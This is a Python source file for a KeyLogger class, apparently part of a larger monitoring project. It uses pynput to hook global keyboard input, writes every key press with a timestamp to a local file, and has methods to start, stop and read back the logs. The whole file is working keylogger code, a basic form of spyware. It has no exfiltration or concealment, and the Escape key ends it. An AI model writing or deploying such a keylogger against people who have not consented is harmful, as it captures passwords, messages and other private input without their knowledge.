from pynput import keyboard
from pathlib import Path
from datetime import datetime
from utils.logger import setup_logging
import os

class KeyLogger:
    """Keylogger class to monitor and record keyboard input."""
    
    def __init__(self):
        self.listener = None
        self.is_running_flag = False
        self.log_file = Path(__file__).parent.parent / 'data' / 'keylogs.txt'
        self.log_file.parent.mkdir(exist_ok=True)
        self.logger = setup_logging('keylogger')
        
    def on_press(self, key):
        """Callback for key press events."""
        try:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"{current_time} - Key pressed: {key.char}\n"
            self.write_to_file(log_entry)
        except AttributeError:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"{current_time} - Special key pressed: {key}\n"
            self.write_to_file(log_entry)
        return True

    def on_release(self, key):
        """Callback for key release events."""
        if key == keyboard.Key.esc:  # Escape key stops the listener (for testing)
            return False
        return True

    def write_to_file(self, data):
        """Write data to keylog file."""
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(data)
        except Exception as e:
            self.logger.error(f"Error writing to keylog file: {e}")
            raise

    def start(self):
        """Start the keylogger."""
        if not self.is_running_flag:
            try:
                self.listener = keyboard.Listener(
                    on_press=self.on_press,
                    on_release=self.on_release)
                self.listener.start()
                self.is_running_flag = True
                self.logger.info("Keylogger started")
            except Exception as e:
                self.logger.error(f"Error starting keylogger: {e}")
                raise

    def stop(self):
        """Stop the keylogger."""
        if self.is_running_flag and self.listener:
            self.listener.stop()
            self.is_running_flag = False
            self.logger.info("Keylogger stopped")

    def is_running(self):
        """Check if keylogger is running."""
        return self.is_running_flag

    def get_logs(self):
        """Read keylog file."""
        try:
            if self.log_file.exists():
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    return f.readlines()
            return []
        except Exception as e:
            self.logger.error(f"Error reading keylogs: {e}")
            raise